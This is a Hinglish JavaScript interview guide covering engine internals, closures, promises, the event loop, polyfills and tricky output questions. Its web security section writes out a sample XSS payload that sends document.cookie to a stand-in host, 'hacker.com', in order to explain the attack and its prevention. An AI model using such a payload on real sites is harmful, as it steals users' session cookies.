# ⚡ JavaScript Complete Interview Master Guide
> **Syllabus & Missing Topics Manifesto:** Yeh guide aapki 124 JavaScript slides ke har ek missing topic ko 100% complete karti hai. Isme V8 Engine internals, Execution Context, Event Loop, Closures, Promises, Prototypal Inheritance, Performance Optimization, Polyfills, Security, aur Tricky Output Questions zero-compromise depth mein covered hain.

---

## 📑 Complete Table of Missing Modules

1. [Module 1: JavaScript Engine & Execution Internals (V8, Memory, GC)](#module-1-javascript-engine--execution-internals)
2. [Module 2: Execution Context, Scope & Closures Deep Dive](#module-2-execution-context-scope--closures-deep-dive)
3. [Module 3: The `this` Keyword & Binding Rules](#module-3-the-this-keyword--binding-rules)
4. [Module 4: Prototypes, Prototype Chain & Prototypal Inheritance](#module-4-prototypes-prototype-chain--prototypal-inheritance)
5. [Module 5: Asynchronous JavaScript, Event Loop & Concurrency](#module-5-asynchronous-javascript-event-loop--concurrency)
6. [Module 6: Advanced Array & Object Built-in Methods](#module-6-advanced-array--object-built-in-methods)
7. [Module 7: Modern ES6+ / ES2020 - ES2024 Syntax & Features](#module-7-modern-es6--es2020---es2024-features)
8. [Module 8: Browser Internals, DOM Lifecycle & Web Performance](#module-8-browser-internals-dom-lifecycle--web-performance)
9. [Module 9: Web Security & Networking (CORS, XSS, CSRF, CSP)](#module-9-web-security--networking)
10. [Module 10: JavaScript Design Patterns](#module-10-javascript-design-patterns)
11. [Module 11: Machine Coding Round — Top 10 Custom Polyfills](#module-11-machine-coding-round--top-10-custom-polyfills)
12. [Module 12: Top 10 Tricky Output-Based Interview Questions](#module-12-top-10-tricky-output-based-interview-questions)

---

## Module 1: JavaScript Engine & Execution Internals

### 1.1 V8 Engine Architecture
JavaScript browser aur Node.js dono mein direct machine code nahi execute karta. V8 Engine (Google dwara C++ me likha) ise execute karta hai:

```
Source Code (JS)
      │
      ▼
   Parser ──► Abstract Syntax Tree (AST)
      │
      ▼
Ignition Interpreter ──► Bytecode (Fast startup, direct execution)
      │
      ├─ Profiler (Gathers profiling data, identifies "Hot Code" / loops)
      ▼
TurboFan Compiler   ──► Highly Optimized Machine Code (JIT)
      │ (De-optimization if variable types change dynamically!)
```

* **Hidden Classes & Inline Caching:**
  * JS dynamically typed language hai, par V8 objects ke liye background mein C++ jaise "Hidden Classes" (Shapes) create karta hai.
  * **Interview Trap:** Agar aap kisi object mein properties alag order me add karte hain, toh V8 alag hidden class banata hai aur execution slow ho jaata hai:
    ```javascript
    // Bad Practice (Shapes differ, De-opts TurboFan):
    const a = {}; a.x = 1; a.y = 2;
    const b = {}; b.y = 2; b.x = 1;

    // Good Practice (Same shape, TurboFan inlines cache):
    class Point { constructor(x, y) { this.x = x; this.y = y; } }
    ```

### 1.2 Memory Management & Garbage Collection
* **Memory Lifecycle:** Allocation $\rightarrow$ Use $\rightarrow$ Release.
* **Stack vs Heap:**
  * **Stack:** Primitive values (`number`, `string`, `boolean`, `null`, `undefined`, `symbol`, `bigint`) aur Call Stack frames store karta hai. Fast access, fixed size.
  * **Heap:** Reference types (`Object`, `Array`, `Function`) dynamic size memory me store hoti hain.
* **Mark-and-Sweep Algorithm:**
  * Purana **Reference Counting** algorithm circular references (`a.b = b; b.a = a;`) pe fail ho jata tha.
  * Modern GC **Mark-and-Sweep** use karta hai: Root (Global object / window) se traversing start hoti hai. Jo objects reach nahi ho sakte, unhe "unreachable" mark karke sweep (delete) kar diya jata hai.
* **Top 4 Memory Leaks in JavaScript:**
  1. **Accidental Global Variables:** `function foo() { bar = "leak"; }` (window.bar ban jata hai).
  2. **Forgotten Timers / Callbacks:** `setInterval` jo kisi DOM element ko reference karta hai aur kabhi `clearInterval` nahi kiya gaya.
  3. **Closures holding unnecessary references:** Inner function outer function ke bade object ko leak kar deta hai.
  4. **Detached DOM Nodes:** JS array me DOM element store hai par page se `remove()` ho chuka hai.

### 1.3 Strict Mode (`"use strict"`)
Strict mode JS code ko strict parsing aur error handling ke sath execute karta hai:
1. Accidental globals banne pe error deta hai (`x = 10;` throws `ReferenceError`).
2. Silently failing operations par exception deta hai (read-only property ko overwrite karne pe).
3. Duplicate parameter names ko forbid karta hai (`function(a, a, b)` throws SyntaxError).
4. `this` inside normal functions `window` banne ke bajaye `undefined` hota hai.

---

## Module 2: Execution Context, Scope & Closures Deep Dive

### 2.1 Execution Context Lifecycle
JS single-threaded synchronous language hai. Har execution context 2 phases me execute hota hai:

```
┌────────────────────────────────────────────────────────┐
│                   EXECUTION CONTEXT                    │
├──────────────────────────┬─────────────────────────────┤
│ 1. Memory Creation Phase │ 2. Code Execution Phase     │
│ (Variable Environment)   │ (Thread of Execution)       │
├──────────────────────────┼─────────────────────────────┤
│ var a = undefined        │ a = 10;                     │
│ function foo = { code }  │ foo(); // creates new FEC   │
│ let b = <uninitialized>  │ b = 20;                     │
└──────────────────────────┴─────────────────────────────┘
```

### 2.2 Hoisting & Temporal Dead Zone (TDZ)
* `var` memory creation phase me `undefined` assign hota hai.
* `let` aur `const` bhi hoist hote hain, par unhe memory me `<uninitialized>` rakha jata hai jab tak declaration line execute na ho. Is duration ko **Temporal Dead Zone (TDZ)** kehte hain.
* TDZ me access karne par `ReferenceError: Cannot access 'x' before initialization` aata hai.

### 2.3 Closures & Lexical Scope
* **Definition:** Ek function jab apne outer lexical environment (scope) ke variables ko "yaad" rakhta hai, chahe outer function execute hoke call stack se nikal chuka ho.
* **Internal Working:** Function ke paas ek internal property hoti hai `[[Scopes]]` jo enclosing environments ka reference rakhti hai.

#### Real-World Use Case 1: Data Encapsulation / Private Variables
```javascript
function createCounter() {
  let count = 0; // Private variable, cannot be accessed directly
  return {
    increment: () => ++count,
    decrement: () => --count,
    getCount: () => count
  };
}
const counter = createCounter();
console.log(counter.increment()); // 1
console.log(counter.count);       // undefined (Protected!)
```

#### Real-World Use Case 2: Memoization Cache
```javascript
function memoize(fn) {
  const cache = {};
  return function (...args) {
    const key = JSON.stringify(args);
    if (key in cache) return cache[key];
    const result = fn.apply(this, args);
    cache[key] = result;
    return result;
  };
}
```

#### Classic Interview Trap: Loop with setTimeout
```javascript
// Problem with var:
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 1000); // Prints: 3, 3, 3
}

// Fix 1: let has Block Scope (Har iteration ka naya lexical environment)
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 1000); // Prints: 0, 1, 2
}

// Fix 2: Using Closure with IIFE
for (var i = 0; i < 3; i++) {
  ((j) => {
    setTimeout(() => console.log(j), 1000); // Prints: 0, 1, 2
  })(i);
}
```

---

## Module 3: The `this` Keyword & Binding Rules

`this` kisi function ke define hone pe nahi, balki **function ko CALL KAISE KIYA GAYA** (Call-Site) par depend karta hai.

### The 4 Binding Rules:
1. **Default Binding:** Normal function call `foo()`.
   * Sloppy mode: `this === window` (browser) ya `global` (Node.js).
   * Strict mode (`"use strict"`): `this === undefined`.
2. **Implicit Binding:** `obj.foo()` call.
   * `this` wahi object hoga jo dot (`.`) ke left me hai.
   * *Loss of binding:* `const fn = obj.foo; fn();` calls default binding!
3. **Explicit Binding:** `.call()`, `.apply()`, `.bind()`.
   * Directly target object specify karte hain.
4. **`new` Binding:** `const user = new User()`.
   * `this` naye ban rahe empty object `{}` ko point karega.

### Precedence Order:
$$\text{new Binding} > \text{Explicit (.bind)} > \text{Implicit (obj.fn)} > \text{Default}$$

### Arrow Functions & Lexical `this`:
* Arrow function ka apna `this`, `arguments`, `super`, ya `new.target` nahi hota.
* Arrow function apne enclosing lexical context ka `this` inherit karta hai.
* `.call()`, `.apply()`, ya `.bind()` arrow function ke `this` ko change **NAHI** kar sakte.

---

## Module 4: Prototypes, Prototype Chain & Prototypal Inheritance

### 4.1 Prototype Chain Architecture
JavaScript me har object ke paas ek hidden link hota hai apne prototype object ki taraf:

```
const arr = [1, 2, 3];

arr.__proto__ === Array.prototype
Array.prototype.__proto__ === Object.prototype
Object.prototype.__proto__ === null (End of Prototype Chain!)
```

* `prototype`: Functions aur Constructor classes par available object blueprint.
* `__proto__`: Har instance object ka actual reference jo uske prototype ko point karta hai (`Object.getPrototypeOf(obj)` is preferred).

### 4.2 Prototypal Inheritance with `Object.create`
```javascript
const animal = {
  isAlive: true,
  eat() { console.log("Eating..."); }
};

const dog = Object.create(animal); // dog.__proto__ = animal
dog.bark = function() { console.log("Woof!"); };

dog.eat(); // "Eating..." (Inherited from animal!)
console.log(dog.isAlive); // true
```

### 4.3 What happens behind the scenes in `new Constructor()`?
Jab aap `new Person("Shiv")` likhte hain, V8 yeh 4 steps karta hai:
1. Naya empty object banata hai: `const obj = {};`
2. Prototype link set karta hai: `Object.setPrototypeOf(obj, Person.prototype);`
3. Constructor ko execute karta hai `obj` ko `this` banakar: `const result = Person.call(obj, "Shiv");`
4. Agar constructor ne koi explicit object return nahi kiya, toh `obj` return karta hai.

### 4.4 ES6 Classes Under the Hood
ES6 classes sirf Prototypal inheritance ke upar **Syntactic Sugar** hain:
```javascript
class Animal {
  constructor(name) { this.name = name; }
  speak() { return `${this.name} makes a noise.`; }
}

class Dog extends Animal {
  constructor(name, breed) {
    super(name); // Calls Animal constructor
    this.breed = breed;
  }
  bark() { return "Woof!"; }
}
```
* `super()` parent class ke constructor ko current instance ke sath call karta hai.
* Private fields `#name` ES2022 me add hue jo hard encapsulation dete hain.

---

## Module 5: Asynchronous JavaScript, Event Loop & Concurrency

### 5.1 Event Loop & Concurrency Model
JavaScript single-threaded runtime hai jo asynchronous I/O ko non-blocking tareeke se handle karta hai.

```
┌────────────────────────────────────────────────────────┐
│                     CALL STACK                         │
│  (Synchronous code executes here line by line)         │
└──────────────────────────┬─────────────────────────────┘
                           │ Async Web API triggered
                           ▼
┌────────────────────────────────────────────────────────┐
│                WEB APIS (Browser Engine)               │
│  DOM Events, setTimeout, setInterval, fetch()          │
└──────────────────────────┬─────────────────────────────┘
                           │ Completed callbacks
                           ▼
         ┌─────────────────┴─────────────────┐
         ▼                                   ▼
┌─────────────────────────┐       ┌──────────────────────┐
│     MICROTASKS QUEUE    │       │   MACROTASKS QUEUE   │
│ (VIP HIGH PRIORITY!)    │       │ (CALLBACK QUEUE)     │
│ 1. Promise .then/catch  │       │ 1. setTimeout        │
│ 2. queueMicrotask       │       │ 2. setInterval       │
│ 3. MutationObserver     │       │ 3. setImmediate (Node)│
│                         │       │ 4. I/O & UI render   │
└────────────┬────────────┘       └──────────┬───────────┘
             │                               │
             └───────────────┬───────────────┘
                             ▼
                    ┌─────────────────┐
                    │   EVENT LOOP    │
                    └─────────────────┘
```

#### Event Loop Rules:
1. Event Loop tabhi run hota hai jab **Call Stack completely empty** ho.
2. Sabse pehle **Microtask Queue** ke saare tasks execute hote hain jab tak queue 0 na ho jaye.
3. Microtask ke andar se naya microtask schedule ho toh woh bhi usi cycle me chalta hai (Microtask starvation possible).
4. Phir Macrotask Queue se **sirf 1 task** pick hoke stack me jata hai.
5. Uske baad browser UI render / repaint check hota hai.

### 5.2 Promises Deep Dive
* **Promise States:** `Pending` $\rightarrow$ `Fulfilled` (Resolved) OR `Rejected`. Once settled, immutable!
* **Promise Chaining:** Har `.then()` return me naya Promise return karta hai.

### 5.3 Promise Combinators Master Matrix

| Method | Kab Resolve hota hai? | Kab Reject hota hai? | Use Case |
| :--- | :--- | :--- | :--- |
| **`Promise.all([p1, p2])`** | Jab **saare** resolve ho jayein (Array of results) | Jaise hi **pehla** reject ho (Fast-fail) | Dependent parallel requests |
| **`Promise.allSettled([p1, p2])`** | Jab **saare** settle ho jayein (Status & Value/Reason) | Kabhi reject nahi hota | Independent batch requests (Analytics/Email) |
| **`Promise.race([p1, p2])`** | Jo **sabse pehla** settle ho (Resolve ya Reject) | Jo sabse pehla reject ho | Request timeout pattern |
| **`Promise.any([p1, p2])`** | Jo **sabse pehla fulfill (resolve)** ho | Jab **saare** reject ho jayein (`AggregateError`) | Redundant fallback mirrors |

### 5.4 `async / await` & Parallelism
```javascript
// Sequential (SLOW - Total 2s + 2s = 4s):
async function sequential() {
  const user = await fetchUser(); // 2s
  const posts = await fetchPosts(); // 2s
}

// Parallel (FAST - Total max(2s, 2s) = 2s):
async function parallel() {
  const [user, posts] = await Promise.all([fetchUser(), fetchPosts()]);
}
```

---

## Module 6: Advanced Array & Object Built-in Methods

### 6.1 `Array.prototype.reduce()`
`reduce` array ke sabhi elements ko ek single value (number, object, grouped array) me condense karta hai:

```javascript
// Grouping by Role:
const employees = [
  { name: "Amit", role: "Dev" },
  { name: "Pooja", role: "Design" },
  { name: "Rahul", role: "Dev" }
];

const grouped = employees.reduce((acc, curr) => {
  acc[curr.role] = acc[curr.role] || [];
  acc[curr.role].push(curr.name);
  return acc;
}, {});
// Result: { Dev: ["Amit", "Rahul"], Design: ["Pooja"] }
```

### 6.2 Missing Array Utility Methods
* **`flat(depth)` & `flatMap()`:** Nested array flattening: `[1, [2, [3]]].flat(2) // [1, 2, 3]`.
* **`some()` vs `every()`:** Boolean checking (at least one vs all elements match condition).
* **ES2023 Non-mutating methods:**
  * `toSorted()`: Original mutate kare bina sorted array deta hai.
  * `toReversed()`: Original mutate kare bina reversed array deta hai.
  * `toSpliced()`: Original mutate kare bina spliced array deta hai.

### 6.3 Missing Object Methods & Deep Clone
* **`Object.freeze(obj)` vs `Object.seal(obj)`:**
  * `freeze`: Read-only banata hai (No add, no delete, no modify existing values).
  * `seal`: No add, no delete, par existing values ko modify kar sakte hain!
  * Dono **shallow** hote hain (Nested objects freeze nahi hote).
* **`Object.defineProperty(obj, prop, descriptor)`:**
  * Property flags: `writable` (value change), `enumerable` (for..in / Object.keys me aana), `configurable` (delete karna ya descriptor change karna).
* **`structuredClone(obj)`:** Modern native deep clone.
  * `JSON.parse(JSON.stringify())` limitations: `Date` ko string bana deta hai, `Map`, `Set`, `undefined`, aur `NaN` break karta hai, aur Circular References me crash karta hai.
  * `structuredClone` circular references, Maps, Sets, Dates sabko perfectly deep copy karta hai!

---

## Module 7: Modern ES6+ / ES2020 - ES2024 Features

### 7.1 Nullish Coalescing (`??`) vs Logical OR (`||`)
* `||` falsy values (`0`, `""`, `false`, `null`, `undefined`, `NaN`) par right side return karta hai.
* `??` sirf `null` aur `undefined` par hi fallback karta hai.

```javascript
const count = 0;
console.log(count || 10); // 10 (BUG: 0 was a valid value!)
console.log(count ?? 10); // 0 (Correct!)
```

### 7.2 Optional Chaining (`?.`)
* `user?.address?.city`: Null ya undefined aate hi short-circuit karke `undefined` de deta hai, runtime `TypeError: Cannot read properties of undefined` se bachata hai.
* Works with function calls: `cb?.()` and dynamic keys: `obj?.[key]`.

### 7.3 `Symbol` & `BigInt`
* **`Symbol`:** Unique primitive value. Object me hidden/unique properties define karne ke kaam aata hai:
  ```javascript
  const id = Symbol("id");
  const user = { [id]: 123, name: "Shiv" };
  console.log(Object.keys(user)); // ["name"] (Symbol keys are hidden from normal iteration!)
  ```
* **`BigInt`:** $2^{53} - 1$ (`Number.MAX_SAFE_INTEGER`) se bade arbitrary precision integers handle karne ke liye (`const big = 9007199254740991n`).

### 7.4 Generators & Iterables
* `function*` generator banata hai jo execution ko pause (`yield`) aur resume kar sakta hai.
* Custom objects ko `[Symbol.iterator]` define karke `for...of` compatible banaya ja sakta hai.

---

## Module 8: Browser Internals, DOM Lifecycle & Web Performance

### 8.1 Critical Rendering Path (CRP) & Reflow vs Repaint
Browser HTML download karne ke baad in 5 steps se page render karta hai:
1. **DOM Tree:** HTML parse karke nodes banata hai.
2. **CSSOM Tree:** CSS parse karke style rules banata hai.
3. **Render Tree:** Visible DOM elements + computed CSS rules combine karta hai (`display: none` render tree me nahi aata, `visibility: hidden` aata hai).
4. **Layout (Reflow):** Har element ki screen par exact geometric position (width, height, coordinates) calculate karta hai.
5. **Paint (Repaint):** Pixels ko screen par draw karta hai (colors, shadows, borders).
6. **Composite:** Layers ko GPU par draw karta hai.

* **Reflow vs Repaint:**
  * Reflow sabse expensive hota hai (font size, width, padding, window resize badalne par poora page recalculate hota hai).
  * Repaint sirf colors/visibility badalne par hota hai.
  * **Optimization:** `DocumentFragment` use karein DOM manipulation batch karne ke liye, ya CSS transforms (`transform`, `opacity`) use karein jo direct Composite layer pe GPU chalaata hai.

### 8.2 `<script>` Loading Strategies

```
HTML Parse:    ████████████████████████████████████████████
<script>:      ════════[PAUSE HTML]──[Download & Run]──►[Resume HTML]
<script async>: ──[Download Async]──[PAUSE HTML & Run]──►[Resume HTML]
<script defer>: ──[Download Async]──────────────────────►[Run after HTML parses]
```

* **`<script async>`:** Download background me hota hai, par jaise hi download hua HTML parsing turant pause karke script execute hoti hai. (Scripts execute out of order!). Independent analytics scripts ke liye best hai.
* **`<script defer>`:** Download background me hota hai, par execution tabhi hota hai jab HTML document poora parse ho chuka ho (`DOMContentLoaded` se pehle). DOM dependent scripts ke liye best hai.

### 8.3 Web Observers
* **`IntersectionObserver`:** Viewport ke andar element ke aane ko bina expensive `window.onscroll` listener ke monitor karta hai (Image Lazy-loading, Infinite scrolling).
* **`ResizeObserver`:** Element ke size change ko monitor karta hai.

### 8.4 Web Storage Comparison

| Storage | Capacity | Lifetime | Server Access | Security Flags |
| :--- | :--- | :--- | :--- | :--- |
| **Cookie** | ~4 KB | Expiry date set hone tak | Har HTTP Request header me jata hai | `HttpOnly`, `Secure`, `SameSite` |
| **localStorage** | ~5-10 MB | Manually clear hone tak persistent | Sirf Client-side JS | Accessible via JS (XSS Vulnerable) |
| **sessionStorage**| ~5 MB | Tab/Window close hone tak | Sirf Client-side JS | Accessible via JS |
| **IndexedDB** | > 250 MB+ | Persistent | Sirf Client-side JS (NoSQL) | Transaction-based |

---

## Module 9: Web Security & Networking

### 9.1 Cross-Origin Resource Sharing (CORS)
* Browser security mechanism (Same-Origin Policy - SOP) jo alag Origin (`Protocol + Domain + Port`) par HTTP requests block karta hai.
* **Preflight Request:** Agar request simple na ho (custom headers jaise `Authorization`, Content-Type `application/json`, PUT/DELETE methods), toh browser pehle ek `OPTIONS` request bhejta hai yeh poochne ke liye ki kya server ise allow karega.
* **Headers:** `Access-Control-Allow-Origin: *`, `Access-Control-Allow-Methods: GET, POST, PUT`, `Access-Control-Allow-Headers`.

### 9.2 XSS (Cross-Site Scripting)
* Attacker malicious JavaScript code ko user ke browser me inject aur execute kar deta hai.
* **Vulnerable Code:** `element.innerHTML = userInput;` (Attacker `<img src=x onerror="fetch('hacker.com?cookie=' + document.cookie)">` bhej sakta hai).
* **Prevention:** Always use `textContent` instead of `innerHTML`, sanitize with DOMPurify, use CSP headers, store session tokens in `HttpOnly` cookies.

### 9.3 CSRF (Cross-Site Request Forgery)
* Authenticated user ke browser se unauthorized commands bhejwana (kyunki browser credentials/cookies automatically attach karta hai).
* **Prevention:** `SameSite=Strict` ya `SameSite=Lax` cookies use karein, Anti-CSRF verification tokens.

---

## Module 10: JavaScript Design Patterns

### 10.1 Observer / Pub-Sub Pattern (Event Emitter)
```javascript
class EventEmitter {
  constructor() {
    this.events = {};
  }

  on(event, listener) {
    if (!this.events[event]) this.events[event] = [];
    this.events[event].push(listener);
  }

  emit(event, ...args) {
    if (this.events[event]) {
      this.events[event].forEach(fn => fn(...args));
    }
  }

  off(event, listener) {
    if (!this.events[event]) return;
    this.events[event] = this.events[event].filter(fn => fn !== listener);
  }
}
```

### 10.2 Module Pattern (IIFE)
```javascript
const UserModule = (() => {
  let privateBalance = 1000;
  function privateLog() { console.log("Transaction recorded."); }

  return {
    getBalance: () => privateBalance,
    deposit: (amount) => {
      privateBalance += amount;
      privateLog();
    }
  };
})();
```

---

## Module 11: Machine Coding Round — Top 10 Custom Polyfills

### 1. `Array.prototype.myMap`
```javascript
Array.prototype.myMap = function (callback) {
  if (typeof callback !== "function") throw new TypeError("Callback must be a function");
  const result = [];
  for (let i = 0; i < this.length; i++) {
    if (i in this) { // Handles sparse arrays
      result.push(callback(this[i], i, this));
    }
  }
  return result;
};
```

### 2. `Array.prototype.myFilter`
```javascript
Array.prototype.myFilter = function (callback) {
  const result = [];
  for (let i = 0; i < this.length; i++) {
    if (i in this && callback(this[i], i, this)) {
      result.push(this[i]);
    }
  }
  return result;
};
```

### 3. `Array.prototype.myReduce`
```javascript
Array.prototype.myReduce = function (callback, initialValue) {
  let accumulator = initialValue;
  let startIndex = 0;

  if (accumulator === undefined) {
    if (this.length === 0) throw new TypeError("Reduce of empty array with no initial value");
    accumulator = this[0];
    startIndex = 1;
  }

  for (let i = startIndex; i < this.length; i++) {
    if (i in this) {
      accumulator = callback(accumulator, this[i], i, this);
    }
  }
  return accumulator;
};
```

### 4. `Function.prototype.myBind`
```javascript
Function.prototype.myBind = function (context, ...args) {
  const targetFn = this;
  return function (...innerArgs) {
    return targetFn.apply(context, [...args, ...innerArgs]);
  };
};
```

### 5. `Array.prototype.myFlat` (Recursive Flattening)
```javascript
Array.prototype.myFlat = function (depth = 1) {
  const result = [];
  (function flatten(arr, currentDepth) {
    for (const item of arr) {
      if (Array.isArray(item) && currentDepth < depth) {
        flatten(item, currentDepth + 1);
      } else {
        result.push(item);
      }
    }
  })(this, 0);
  return result;
};
```

### 6. `Promise.all` Polyfill
```javascript
Promise.myAll = function (promises) {
  return new Promise((resolve, reject) => {
    const results = [];
    let completed = 0;
    if (promises.length === 0) return resolve(results);

    promises.forEach((promise, index) => {
      Promise.resolve(promise)
        .then(value => {
          results[index] = value;
          completed++;
          if (completed === promises.length) resolve(results);
        })
        .catch(err => reject(err));
    });
  });
};
```

### 7. Custom `debounce(fn, delay)`
```javascript
function debounce(fn, delay) {
  let timerId;
  return function (...args) {
    clearTimeout(timerId);
    timerId = setTimeout(() => {
      fn.apply(this, args);
    }, delay);
  };
}
```

### 8. Custom `throttle(fn, limit)`
```javascript
function throttle(fn, limit) {
  let inThrottle = false;
  return function (...args) {
    if (!inThrottle) {
      fn.apply(this, args);
      inThrottle = true;
      setTimeout(() => inThrottle = false, limit);
    }
  };
}
```

### 9. Deep Clone (Circular References Handled)
```javascript
function deepClone(obj, hash = new WeakMap()) {
  if (obj === null || typeof obj !== "object") return obj;
  if (obj instanceof Date) return new Date(obj);
  if (obj instanceof RegExp) return new RegExp(obj);
  if (hash.has(obj)) return hash.get(obj); // Cycle detection!

  const clone = Array.isArray(obj) ? [] : {};
  hash.set(obj, clone);

  for (const key of Reflect.ownKeys(obj)) {
    clone[key] = deepClone(obj[key], hash);
  }
  return clone;
}
```

### 10. Flatten Nested Object
```javascript
function flattenObject(obj, prefix = "") {
  let result = {};
  for (const key in obj) {
    if (typeof obj[key] === "object" && obj[key] !== null && !Array.isArray(obj[key])) {
      Object.assign(result, flattenObject(obj[key], `${prefix}${key}.`));
    } else {
      result[`${prefix}${key}`] = obj[key];
    }
  }
  return result;
}
```

---

## Module 12: Top 10 Tricky Output-Based Interview Questions

### Q1: Event Loop Execution Order
```javascript
console.log('1');
setTimeout(() => console.log('2'), 0);
Promise.resolve().then(() => console.log('3'));
queueMicrotask(() => console.log('4'));
console.log('5');

// Output: 1, 5, 3, 4, 2
// Explanation: 1 and 5 are synchronous on Call Stack.
// 3 and 4 go to Microtask Queue (executed immediately after stack is empty).
// 2 is in Macrotask Queue (runs last).
```

### Q2: Object Keys Type Coercion
```javascript
const a = {}, b = { key: 'b' }, c = { key: 'c' };
a[b] = 123;
a[c] = 456;
console.log(a[b]);

// Output: 456
// Explanation: Object keys are converted to strings.
// b and c both coerce to "[object Object]". So a["[object Object]"] gets overwritten to 456!
```

### Q3: `this` with Arrow Function in Object
```javascript
const user = {
  name: "Shiv",
  regularFn: function () { console.log(this.name); },
  arrowFn: () => { console.log(this.name); }
};
user.regularFn(); // "Shiv" (this is user)
user.arrowFn();   // undefined (this is window/global, arrow functions have no this)
```

### Q4: Hoisting Precedence
```javascript
var myVar = 1;
function check() {
  console.log(myVar);
  var myVar = 2;
}
check();

// Output: undefined
// Explanation: Inside check(), local myVar is hoisted and shadows the outer myVar.
// At the time of console.log, local myVar exists in scope with value `undefined`.
```

### Q5: Weird Type Coercions
```javascript
console.log([] + []);      // "" (Empty string)
console.log([] + {});      // "[object Object]"
console.log({} + []);      // "[object Object]" (or 0 in browser console if {} is treated as empty block)
console.log("5" - 3);      // 2 (Subtraction coerces string to number)
console.log("5" + 3);      // "53" (Addition concatenates strings)
console.log(true + false); // 1 (1 + 0)
console.log(typeof NaN);   // "number"
console.log(NaN === NaN);  // false (NaN is the only value in JS not equal to itself!)
```

### Q6: Function Parameter Default Values & Scope
```javascript
let x = 1;
function foo(x, y = () => x) {
  var x = 2;
  console.log(y());
}
foo();

// Output: undefined
// Explanation: Default parameter scope is separate from function body scope.
// y() captures the parameter `x`, which is undefined because no value was passed.
```

### Q7: Array Length Mutation
```javascript
const arr = [1, 2, 3, 4, 5];
arr.length = 2;
console.log(arr); // [1, 2] (Truncates the array!)
arr.length = 5;
console.log(arr); // [1, 2, <3 empty items>] (Creates sparse array)
```

### Q8: `delete` Operator on Variables vs Properties
```javascript
var x = 10;
const y = 20;
delete x;
delete y;
console.log(x, y); // 10, 20
// Explanation: `delete` only deletes configurable properties from objects, not declared variables!
```

### Q9: `setTimeout` and `this` Context Loss
```javascript
const obj = {
  count: 10,
  doCount: function () {
    setTimeout(function () {
      console.log(this.count);
    }, 100);
  }
};
obj.doCount(); // undefined
// Explanation: The callback inside setTimeout is invoked by the browser environment,
// where `this` falls back to `window` (or undefined in strict mode).
// Fix: Use arrow function () => console.log(this.count) or .bind(this).
```

### Q10: `Promise.resolve` Chaining Traps
```javascript
Promise.resolve(1)
  .then(x => x + 1)
  .then(x => { throw new Error('My Error') })
  .catch(() => 100)
  .then(x => x + 1)
  .then(x => console.log(x))
  .catch(err => console.log('Final catch', err));

// Output: 101
// Explanation: The error is caught by .catch(() => 100), which returns 100 as a resolved value!
// The next .then receives 100 and computes 100 + 1 = 101.
```
